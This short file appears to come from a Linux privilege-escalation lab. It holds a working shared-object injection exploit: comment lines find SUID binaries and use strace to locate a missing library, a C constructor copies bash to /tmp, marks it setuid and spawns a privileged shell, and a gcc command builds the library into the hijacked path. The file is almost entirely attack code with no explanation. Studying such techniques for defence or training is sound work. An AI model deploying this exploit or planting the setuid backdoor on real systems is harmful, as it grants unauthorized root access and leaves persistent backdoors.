// $ find / -type f -perm -04000 -ls 2>/dev/null
// $ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

// $ gcc -shared -o /home/user/.config/shared_object_injection.so -fPIC /home/user/.config/shared_object_injection.c
